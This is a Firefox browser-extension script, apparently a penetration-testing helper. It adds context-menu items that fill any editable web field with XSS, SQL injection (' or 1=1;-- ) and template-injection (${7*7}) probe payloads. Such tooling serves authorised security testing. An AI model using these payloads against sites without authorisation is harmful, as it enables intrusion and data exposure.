let elem = 0

browser.menus.create({
  id: "xss-var",
  title: "Inject XSS with variable name",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.create({
  id: "xss",
  title: "Inject simple XSS",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.create({
  id: "simple-sqli",
  title: "Inject simple quote SQL",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.create({
  id: "double-sqli",
  title: "Inject double quote SQL",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.create({
  id: "template-injection",
  title: "Inject template",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.onClicked.addListener((info, tab) => {
  if (info.menuItemId == "xss-var") {
    browser.tabs.executeScript(tab.id, {
      frameId: info.frameId,
      code: `elem = browser.menus.getTargetElement(${info.targetElementId});
      elem.value="<img src=1 onerror=alert(\'" + elem.id + "\')>"`,
    });
  } else if (info.menuItemId == "xss") {
    browser.tabs.executeScript(tab.id, {
      frameId: info.frameId,
      code: `elem = browser.menus.getTargetElement(${info.targetElementId});
      elem.value="<img src=1 onerror=alert()>"`,
    });
  } else if (info.menuItemId == "simple-sqli") {
    browser.tabs.executeScript(tab.id, {
      frameId: info.frameId,
      code: `elem = browser.menus.getTargetElement(${info.targetElementId});
      elem.value="' or 1=1;-- "`,
    });
  } else if (info.menuItemId == "double-sqli") {
    browser.tabs.executeScript(tab.id, {
      frameId: info.frameId,
      code: `elem = browser.menus.getTargetElement(${info.targetElementId});
      elem.value='" or 1=1;-- '`,
    });
  } else if (info.menuItemId == "template-injection") {
    browser.tabs.executeScript(tab.id, {
      frameId: info.frameId,
      code: `elem = browser.menus.getTargetElement(${info.targetElementId});
      elem.value='\${7*7}'`,
    });
  }
});